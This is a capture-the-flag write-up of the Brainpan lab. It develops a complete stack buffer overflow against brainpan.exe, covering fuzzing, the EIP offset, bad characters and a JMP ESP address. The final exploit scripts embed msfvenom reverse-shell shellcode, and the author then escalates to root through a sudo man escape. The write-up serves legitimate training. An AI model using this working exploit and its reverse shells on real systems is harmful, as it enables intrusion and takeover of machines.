# Brainpan 1

**Room Link:** [https://tryhackme.com/room/brainpan](https://tryhackme.com/room/brainpan)

## Scanning

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (7) (3).png" alt=""><figcaption></figcaption></figure>

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (12) (1) (2).png" alt=""><figcaption></figcaption></figure>





### Abyss/TCP port 9999

Abyss appears to have a program running but we can't interact.&#x20;

![](<../../.gitbook/assets/image (5) (5) (1).png>)

```
gobuster dir -u http://$VICTIM:9999 -w /usr/share/dirb/wordlists/big.txt -t 50
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### http/TCP port 10000

```
gobuster dir -u http://$VICTIM:10000 -w /usr/share/dirb/wordlists/big.txt -t 50
```

<figure><img src="../../.gitbook/assets/image (13) (1) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

brainpan.exe file found.

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

### Test Machine

As we have the .exe we're going to test on our Windows lab machine.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
python2 -m SimpleHTTPServer 81
```

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

### **Crash Replication & Controlling EIP**

I crashed the program by sending 1000 As

```
python -c 'print("A"* 1000)'
nc -v $TESTMACHINE 31337
```

**fuzzer.py**

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = ""
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))

		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```

Fuzzer was able to crash the program around 1000 bytes so we got really lucky when we sent our As

```
python fuzzer.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (14) (6).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1000
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 524.

**Kali**

```
python exploit.py $VICTIM 9999
```

**Immunity Debugger**

```
!mona findmsp -distance 1000
```

<figure><img src="../../.gitbook/assets/image (3) (7) (1).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 524
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. We found no bad characters so we'll just add \x00.

**exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad chars found: \x00
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 524
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```



<figure><img src="../../.gitbook/assets/image (10) (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (4).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with SafeSEH, ASLR, and NXCompat disabled and the memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. 0x311700000 is the only possible address to use.

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (20) (1) (3).png" alt=""><figcaption></figcaption></figure>

We find that brainpan.exe has only one possible JMP ESPs to use. So we will try  0x311712f3 but when we add it to our code we need it in little endian format so it becomes \xf3\x12\x17\31.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m brainpan.exe
```

<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

### Exploit - Staging

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 524
	overflow = "A" * offset
	retn = "\xf3\x12\x17\x31"
	padding =  "\x90" * 16
	payload = ("\xbb\x27\x8f\x81\x23\xdb\xd8\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x5f\x12\x83\xef\xfc\x03\x78\x81\x63\xd6\x7a\x75\xe1"
"\x19\x82\x86\x86\x90\x67\xb7\x86\xc7\xec\xe8\x36\x83\xa0\x04"
"\xbc\xc1\x50\x9e\xb0\xcd\x57\x17\x7e\x28\x56\xa8\xd3\x08\xf9"
"\x2a\x2e\x5d\xd9\x13\xe1\x90\x18\x53\x1c\x58\x48\x0c\x6a\xcf"
"\x7c\x39\x26\xcc\xf7\x71\xa6\x54\xe4\xc2\xc9\x75\xbb\x59\x90"
"\x55\x3a\x8d\xa8\xdf\x24\xd2\x95\x96\xdf\x20\x61\x29\x09\x79"
"\x8a\x86\x74\xb5\x79\xd6\xb1\x72\x62\xad\xcb\x80\x1f\xb6\x08"
"\xfa\xfb\x33\x8a\x5c\x8f\xe4\x76\x5c\x5c\x72\xfd\x52\x29\xf0"
"\x59\x77\xac\xd5\xd2\x83\x25\xd8\x34\x02\x7d\xff\x90\x4e\x25"
"\x9e\x81\x2a\x88\x9f\xd1\x94\x75\x3a\x9a\x39\x61\x37\xc1\x55"
"\x46\x7a\xf9\xa5\xc0\x0d\x8a\x97\x4f\xa6\x04\x94\x18\x60\xd3"
"\xdb\x32\xd4\x4b\x22\xbd\x25\x42\xe1\xe9\x75\xfc\xc0\x91\x1d"
"\xfc\xed\x47\xb1\xac\x41\x38\x72\x1c\x22\xe8\x1a\x76\xad\xd7"
"\x3b\x79\x67\x70\xd1\x80\xe0\x75\x2c\x79\x4f\xe1\x32\x7d\xa1"
"\xae\xbb\x9b\xab\x5e\xea\x34\x44\xc6\xb7\xce\xf5\x07\x62\xab"
"\x36\x83\x81\x4c\xf8\x64\xef\x5e\x6d\x85\xba\x3c\x38\x9a\x10"
"\x28\xa6\x09\xff\xa8\xa1\x31\xa8\xff\xe6\x84\xa1\x95\x1a\xbe"
"\x1b\x8b\xe6\x26\x63\x0f\x3d\x9b\x6a\x8e\xb0\xa7\x48\x80\x0c"
"\x27\xd5\xf4\xc0\x7e\x83\xa2\xa6\x28\x65\x1c\x71\x86\x2f\xc8"
"\x04\xe4\xef\x8e\x08\x21\x86\x6e\xb8\x9c\xdf\x91\x75\x49\xe8"
"\xea\x6b\xe9\x17\x21\x28\x09\xfa\xe3\x45\xa2\xa3\x66\xe4\xaf"
"\x53\x5d\x2b\xd6\xd7\x57\xd4\x2d\xc7\x12\xd1\x6a\x4f\xcf\xab"
"\xe3\x3a\xef\x18\x03\x6f")
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $TESTMACHINE 9999
```

<figure><img src="../../.gitbook/assets/image (11) (6) (2).png" alt=""><figcaption></figcaption></figure>

### Exploit - Production #1

The program worked against our staging environment so it should work against the actual box we're trying to exploit. It ends up working with exploit.py.

**Kali #1**

```
rlwrap nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 9999
```

<figure><img src="../../.gitbook/assets/image (1) (8).png" alt=""><figcaption></figcaption></figure>

### Exploit - Production #2

Shortly after exploring the Victims OS it had the directory of a Linux server. I realized that it was running.&#x20;

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 524
	overflow = "A" * offset
	retn = "\xf3\x12\x17\x31"
	padding =  "\x90" * 16
	payload = ("\xd9\xc9\xd9\x74\x24\xf4\x5f\xba\xec\xbf\x44\xe4\x29\xc9\xb1"
"\x12\x31\x57\x17\x03\x57\x17\x83\x03\x43\xa6\x11\xea\x67\xd0"
"\x39\x5f\xdb\x4c\xd4\x5d\x52\x93\x98\x07\xa9\xd4\x4a\x9e\x81"
"\xea\xa1\xa0\xab\x6d\xc3\xc8\x21\x84\xc0\xb7\x5e\x9a\x26\xd6"
"\xc2\x13\xc7\x68\x9c\x73\x59\xdb\xd2\x77\xd0\x3a\xd9\xf8\xb0"
"\xd4\x8c\xd7\x47\x4c\x39\x07\x87\xee\xd0\xde\x34\xbc\x71\x68"
"\x5b\xf0\x7d\xa7\x1c")
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 9999
```

**Victim**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

### **Transfer LinPeas**

I tried transfering LinPeas but it didn't end up really using anything from the output.

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://10.10.243.191:81/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Privilege Escalation

We discovered we can run the command anansi\_util as sudo without a password. gtfobins showed a way to become root if we can run manual which the program allowed us to do.

**Exploit:** [https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
sudo -l
sudo /home/anansi/bin/anansi_util manual
```

<figure><img src="../../.gitbook/assets/image (10) (4) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are able to run the commands mentioned on gtfobins and get a root shell.

<pre><code>sudo /home/anansi/bin/anansi_util manual man
<strong>!/bin/sh
</strong>whoami
</code></pre>

<figure><img src="../../.gitbook/assets/image (5) (6) (1).png" alt=""><figcaption></figcaption></figure>
